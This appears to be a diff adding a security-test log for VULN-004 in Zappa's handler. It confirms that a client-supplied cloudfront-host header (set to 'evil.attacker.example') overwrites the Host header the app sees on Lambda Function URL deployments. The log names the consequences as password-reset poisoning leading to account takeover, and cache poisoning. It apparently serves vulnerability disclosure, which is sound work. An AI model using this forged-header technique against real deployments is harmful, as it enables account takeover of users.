@@ -1,0 +1,12 @@
+==========================================================================
+VULN-004: cloudfront-host header overwrites the app Host (Function URL)
+target : http://localhost:22571
+[INFO] exercising: zappa/handler.py:813-815 (host.find('lambda-url') + cloudfront-host swap)
+==========================================================================
+[STEP] sending Host='abc123def456.lambda-url.us-east-1.on.aws' + cloudfront-host='evil.attacker.example' (models CloudFront->Function URL)
+[INFO] app-seen Host header = 'evil.attacker.example'
+[STEP] control: same request WITHOUT cloudfront-host (Host should stay the Function-URL host)
+[INFO] app-seen Host header (control) = 'abc123def456.lambda-url.us-east-1.on.aws'
+[PROOF] the client-supplied cloudfront-host (evil.attacker.example) replaced the Host the app sees; without it the app kept 'abc123def456.lambda-url.us-east-1.on.aws'. On a Function-URL deploy an attacker sets the app's Host at will → password-reset/absolute-URL poisoning (ATO) and cache poisoning.
+[OK] exploit confirmed — Host overwritten by client cloudfront-host header
+==> VULN-004: CONFIRMED — cloudfront-host overwrites app Host on Function-URL deploys
